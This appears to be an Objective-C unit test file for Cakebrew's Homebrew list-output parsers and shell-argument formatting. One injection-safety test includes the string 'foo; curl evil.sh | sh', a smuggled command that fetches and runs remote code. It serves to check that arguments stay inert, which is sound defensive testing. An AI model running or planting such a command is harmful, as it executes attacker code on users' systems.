//
//  BPHomebrewInterfaceListCallTests.m
//  CakebrewTests
//
//  Characterization tests for the private list-call parsers that turn raw
//  `brew list --versions` / `brew outdated --verbose` output into BPFormula
//  objects. The classes live in BPHomebrewInterface.m (compiled into this test
//  target); their interfaces are re-declared below so the tests can reach them.
//

#import <XCTest/XCTest.h>
#import "BPFormula.h"
#import "BPHomebrewInterface.h"

// Exposes the private output-block helper for the nil-safety regression tests.
@interface BPHomebrewInterface (Testing)
- (void)invokeOutputBlock:(void (^)(NSString *))block withString:(NSString *)string;
- (NSArray *)formatArguments:(NSArray *)extraArguments sendOutputId:(BOOL)sendOutputID;
@end

@interface BPHomebrewInterfaceListCall : NSObject
@property (strong, readonly) NSArray *arguments;
- (instancetype)initWithArguments:(NSArray *)arguments;
- (NSArray<BPFormula *> *)parseData:(NSString *)data;
- (BPFormula *)parseFormulaItem:(NSString *)item;
@end

@interface BPHomebrewInterfaceListCallInstalled : BPHomebrewInterfaceListCall
- (instancetype)init;
@end

@interface BPHomebrewInterfaceListCallUpgradeable : BPHomebrewInterfaceListCall
- (instancetype)init;
@end

@interface BPHomebrewInterfaceListCallPinned : BPHomebrewInterfaceListCall
- (instancetype)init;
@end

@interface BPHomebrewInterfaceListCallInstalledCasks : BPHomebrewInterfaceListCallInstalled
- (instancetype)init;
@end

@interface BPHomebrewInterfaceListCallOutdatedCasks : BPHomebrewInterfaceListCallUpgradeable
- (instancetype)init;
@end

@interface BPHomebrewInterfaceListCallAllCasks : BPHomebrewInterfaceListCall
- (instancetype)init;
@end

@interface BPHomebrewInterfaceListCallTests : XCTestCase
@end

@implementation BPHomebrewInterfaceListCallTests

#pragma mark - parseData (base)

- (void)testParseDataDropsTrailingNewlineElement
{
	// brew output is newline-terminated; the final empty element must be dropped.
	BPHomebrewInterfaceListCall *call = [[BPHomebrewInterfaceListCall alloc] initWithArguments:@[]];
	NSArray<BPFormula *> *result = [call parseData:@"alpha\nbeta\ngamma\n"];

	XCTAssertEqual(result.count, 3u, @"trailing empty line should be dropped");
	XCTAssertEqualObjects(result.firstObject.name, @"alpha");
	XCTAssertEqualObjects(result.lastObject.name, @"gamma");
}

- (void)testParseDataEmptyInputYieldsNoFormulae
{
	BPHomebrewInterfaceListCall *call = [[BPHomebrewInterfaceListCall alloc] initWithArguments:@[]];
	NSArray<BPFormula *> *result = [call parseData:@""];

	XCTAssertEqual(result.count, 0u);
}

#pragma mark - installed parser (`list --versions`)

- (void)testInstalledParserSplitsNameAndVersion
{
	BPHomebrewInterfaceListCallInstalled *call = [BPHomebrewInterfaceListCallInstalled new];
	BPFormula *formula = [call parseFormulaItem:@"ffmpeg 2.7.2"];

	XCTAssertEqualObjects(formula.name, @"ffmpeg");
	XCTAssertEqualObjects(formula.version, @"2.7.2");
}

- (void)testInstalledParserUsesLastOfMultipleInstalledVersions
{
	BPHomebrewInterfaceListCallInstalled *call = [BPHomebrewInterfaceListCallInstalled new];
	BPFormula *formula = [call parseFormulaItem:@"python 3.9 3.10"];

	XCTAssertEqualObjects(formula.name, @"python");
	XCTAssertEqualObjects(formula.version, @"3.10", @"last token is the most recent installed version");
}

- (void)testInstalledParserKeepsTapQualifiedNameWithShortInstalledName
{
	BPHomebrewInterfaceListCallInstalled *call = [BPHomebrewInterfaceListCallInstalled new];
	BPFormula *formula = [call parseFormulaItem:@"homebrew/dupes/zlib 1.2.8"];

	XCTAssertEqualObjects(formula.name, @"homebrew/dupes/zlib", @"the full tap-qualified name is preserved");
	XCTAssertEqualObjects(formula.installedName, @"zlib", @"installedName strips the tap prefix");
	XCTAssertEqualObjects(formula.version, @"1.2.8");
}

- (void)testInstalledParserParsesMultiLineDataThroughSubclass
{
	// parseData on the base class must dispatch to the subclass parseFormulaItem.
	BPHomebrewInterfaceListCallInstalled *call = [BPHomebrewInterfaceListCallInstalled new];
	NSArray<BPFormula *> *formulae = [call parseData:@"ffmpeg 2.7.2\npython 3.10\n"];

	XCTAssertEqual(formulae.count, 2u);
	XCTAssertEqualObjects(formulae[0].name, @"ffmpeg");
	XCTAssertEqualObjects(formulae[0].version, @"2.7.2");
	XCTAssertEqualObjects(formulae[1].name, @"python");
	XCTAssertEqualObjects(formulae[1].version, @"3.10");
}

#pragma mark - upgradeable parser (`outdated --verbose`)

- (void)testUpgradeableParserSingleVersion
{
	BPHomebrewInterfaceListCallUpgradeable *call = [BPHomebrewInterfaceListCallUpgradeable new];
	BPFormula *formula = [call parseFormulaItem:@"ffmpeg (2.7.1) < 2.7.2"];

	XCTAssertEqualObjects(formula.name, @"ffmpeg");
	XCTAssertEqualObjects(formula.version, @"2.7.1");
	XCTAssertEqualObjects(formula.latestVersion, @"2.7.2");
}

- (void)testUpgradeableParserMultipleInstalledVersionsUsesLast
{
	BPHomebrewInterfaceListCallUpgradeable *call = [BPHomebrewInterfaceListCallUpgradeable new];
	BPFormula *formula = [call parseFormulaItem:@"foo (1.0, 1.1) < 2.0"];

	XCTAssertEqualObjects(formula.name, @"foo");
	XCTAssertEqualObjects(formula.version, @"1.1", @"the last of the installed versions is reported");
	XCTAssertEqualObjects(formula.latestVersion, @"2.0");
}

- (void)testUpgradeableParserNonMatchingLineFallsBackToName
{
	BPHomebrewInterfaceListCallUpgradeable *call = [BPHomebrewInterfaceListCallUpgradeable new];
	BPFormula *formula = [call parseFormulaItem:@"justaname"];

	XCTAssertEqualObjects(formula.name, @"justaname");
	XCTAssertNil(formula.latestVersion);
}

#pragma mark - pinned parser (`list --pinned`)

- (void)testPinnedCallUsesListPinnedArguments
{
	BPHomebrewInterfaceListCallPinned *call = [BPHomebrewInterfaceListCallPinned new];
	XCTAssertEqualObjects(call.arguments, (@[ @"list", @"--pinned" ]));
}

- (void)testPinnedParserReturnsNameOnlyFormulae
{
	// `brew list --pinned` prints one formula name per line, no versions.
	BPHomebrewInterfaceListCallPinned *call = [BPHomebrewInterfaceListCallPinned new];
	NSArray<BPFormula *> *formulae = [call parseData:@"git\nwget\n"];

	XCTAssertEqual(formulae.count, 2u);
	XCTAssertEqualObjects(formulae[0].name, @"git");
	XCTAssertNil(formulae[0].version, @"pinned list is name-only");
	XCTAssertEqualObjects(formulae[1].name, @"wget");
}

#pragma mark - installed casks parser (`list --cask --versions`)

- (void)testInstalledCasksCallUsesListCaskVersionsArguments
{
	BPHomebrewInterfaceListCallInstalledCasks *call = [BPHomebrewInterfaceListCallInstalledCasks new];
	XCTAssertEqualObjects(call.arguments, (@[ @"list", @"--cask", @"--versions" ]));
}

- (void)testInstalledCasksParserSplitsTokenAndVersion
{
	// `brew list --cask --versions` prints "token version", same shape as the
	// installed-formula list, so the parser is inherited.
	BPHomebrewInterfaceListCallInstalledCasks *call = [BPHomebrewInterfaceListCallInstalledCasks new];
	BPFormula *cask = [call parseFormulaItem:@"google-chrome 120.0.6099.109"];

	XCTAssertEqualObjects(cask.name, @"google-chrome");
	XCTAssertEqualObjects(cask.version, @"120.0.6099.109");
}

- (void)testInstalledCasksParserKeepsCommaVersion
{
	// Cask versions can contain a comma (version,revision) but no spaces.
	BPHomebrewInterfaceListCallInstalledCasks *call = [BPHomebrewInterfaceListCallInstalledCasks new];
	BPFormula *cask = [call parseFormulaItem:@"antigravity 2.2.1,5287492581195776"];

	XCTAssertEqualObjects(cask.name, @"antigravity");
	XCTAssertEqualObjects(cask.version, @"2.2.1,5287492581195776");
}

- (void)testInstalledCasksParserMarksResultAsCask
{
	// Operations dispatch on the cask flag (`brew uninstall --cask ...`), so
	// everything parsed from the cask list must carry it.
	BPHomebrewInterfaceListCallInstalledCasks *call = [BPHomebrewInterfaceListCallInstalledCasks new];
	BPFormula *cask = [call parseFormulaItem:@"google-chrome 120.0.6099.109"];

	XCTAssertTrue(cask.cask);
}

- (void)testInstalledFormulaeParserDoesNotMarkCask
{
	BPHomebrewInterfaceListCallInstalled *call = [BPHomebrewInterfaceListCallInstalled new];
	BPFormula *formula = [call parseFormulaItem:@"ffmpeg 2.7.2"];

	XCTAssertFalse(formula.cask);
}

#pragma mark - outdated casks parser (`outdated --cask --verbose`)

- (void)testOutdatedCasksCallUsesOutdatedCaskVerboseArguments
{
	BPHomebrewInterfaceListCallOutdatedCasks *call = [BPHomebrewInterfaceListCallOutdatedCasks new];
	XCTAssertEqualObjects(call.arguments, (@[ @"outdated", @"--cask", @"--verbose" ]));
}

- (void)testOutdatedCasksParserParsesNotEqualComparator
{
	// Cask lines use `!=` (cask versions aren't ordered), not the `<` that
	// formula lines use: "acorn (8.6) != 8.6.1".
	BPHomebrewInterfaceListCallOutdatedCasks *call = [BPHomebrewInterfaceListCallOutdatedCasks new];
	BPFormula *cask = [call parseFormulaItem:@"acorn (8.6) != 8.6.1"];

	XCTAssertEqualObjects(cask.name, @"acorn");
	XCTAssertEqualObjects(cask.version, @"8.6");
	XCTAssertEqualObjects(cask.latestVersion, @"8.6.1");
	XCTAssertTrue(cask.cask, @"outdated-cask results must carry the cask flag");
}

- (void)testOutdatedCasksParserHandlesCommaVersions
{
	BPHomebrewInterfaceListCallOutdatedCasks *call = [BPHomebrewInterfaceListCallOutdatedCasks new];
	BPFormula *cask = [call parseFormulaItem:@"claude (1.14271.0,c8f4d811) != 1.20186.1,df1d8a33"];

	XCTAssertEqualObjects(cask.name, @"claude");
	XCTAssertEqualObjects(cask.version, @"1.14271.0,c8f4d811");
	XCTAssertEqualObjects(cask.latestVersion, @"1.20186.1,df1d8a33");
}

#pragma mark - all casks parser (`brew casks`)

- (void)testAllCasksCallUsesCasksArguments
{
	BPHomebrewInterfaceListCallAllCasks *call = [BPHomebrewInterfaceListCallAllCasks new];
	XCTAssertEqualObjects(call.arguments, @[ @"casks" ]);
}

- (void)testAllCasksParserReturnsNameOnlyCasks
{
	// `brew casks` prints one token per line, no versions.
	BPHomebrewInterfaceListCallAllCasks *call = [BPHomebrewInterfaceListCallAllCasks new];
	NSArray<BPFormula *> *casks = [call parseData:@"0-ad\n010-editor\nfirefox\n"];

	XCTAssertEqual(casks.count, 3u);
	XCTAssertEqualObjects(casks[2].name, @"firefox");
	XCTAssertNil(casks[2].version);
	XCTAssertTrue(casks[2].cask, @"the all-casks list must mark results as casks");
}

- (void)testUpgradeableParserStillParsesFormulaComparator
{
	// Generalizing the comparator for casks must not regress formula lines.
	BPHomebrewInterfaceListCallUpgradeable *call = [BPHomebrewInterfaceListCallUpgradeable new];
	BPFormula *formula = [call parseFormulaItem:@"ffmpeg (2.7.1) < 2.7.2"];

	XCTAssertEqualObjects(formula.name, @"ffmpeg");
	XCTAssertEqualObjects(formula.version, @"2.7.1");
	XCTAssertEqualObjects(formula.latestVersion, @"2.7.2");
	XCTAssertFalse(formula.cask);
}

#pragma mark - output-block nil safety (regression: pin/unpin pass a nil block)

- (void)testInvokeOutputBlockWithNilBlockIsSafeNoOp
{
	// pin/unpin call the brew command with a nil return block. The command path
	// invoked that block unconditionally, so a nil block was an EXC_BAD_ACCESS.
	// Reaching the assertion below (no crash) is the regression check.
	[[BPHomebrewInterface sharedInterface] invokeOutputBlock:nil withString:@"anything"];
	XCTAssertTrue(YES, @"invoking a nil output block must be a safe no-op");
}

- (void)testInvokeOutputBlockDeliversStringToNonNilBlock
{
	__block NSString *received = nil;
	[[BPHomebrewInterface sharedInterface] invokeOutputBlock:^(NSString *string) {
		received = string;
	} withString:@"hello"];

	XCTAssertEqualObjects(received, @"hello", @"a non-nil block still receives the output");
}

#pragma mark - formatArguments: (shell-injection safety)

- (void)testFormatArgumentsPassesArgsAsPositionalParameters
{
	// -l -c '<script>' <$0> <$1> ... — args live in argv, not the command string.
	NSArray *argv = [[BPHomebrewInterface sharedInterface] formatArguments:@[ @"tap", @"user/repo" ] sendOutputId:NO];

	XCTAssertEqualObjects(argv[0], @"-l");
	XCTAssertEqualObjects(argv[1], @"-c");
	XCTAssertEqualObjects(argv[2], @"brew \"$@\"", @"the command references $@, not interpolated args");
	XCTAssertEqualObjects(argv[3], @"brew", @"$0 is a label");
	XCTAssertEqualObjects(argv[4], @"tap");
	XCTAssertEqualObjects(argv[5], @"user/repo");
}

- (void)testFormatArgumentsKeepsShellMetacharactersInert
{
	NSString *malicious = @"foo; curl evil.sh | sh";
	NSArray *argv = [[BPHomebrewInterface sharedInterface] formatArguments:@[ @"tap", malicious ] sendOutputId:NO];

	// The injected payload must never reach the shell command string...
	XCTAssertFalse([argv[2] containsString:@"curl"], @"user input must not reach the command string");
	// ...and must survive as a single, unsplit argument.
	XCTAssertTrue([argv containsObject:malicious], @"the malicious string stays one argument");
}

- (void)testFormatArgumentsWithOutputIdKeepsMarkerAndPositionalArgs
{
	NSArray *argv = [[BPHomebrewInterface sharedInterface] formatArguments:@[ @"list" ] sendOutputId:YES];

	XCTAssertTrue([argv[2] hasPrefix:@"echo "], @"the output marker is still emitted");
	XCTAssertTrue([argv[2] hasSuffix:@"brew \"$@\""]);
	XCTAssertEqualObjects(argv.lastObject, @"list");
}

- (void)testFormatArgumentsHandlesEmptyArguments
{
	NSArray *argv = [[BPHomebrewInterface sharedInterface] formatArguments:@[] sendOutputId:NO];
	XCTAssertEqualObjects(argv, (@[ @"-l", @"-c", @"brew \"$@\"", @"brew" ]));
}

@end
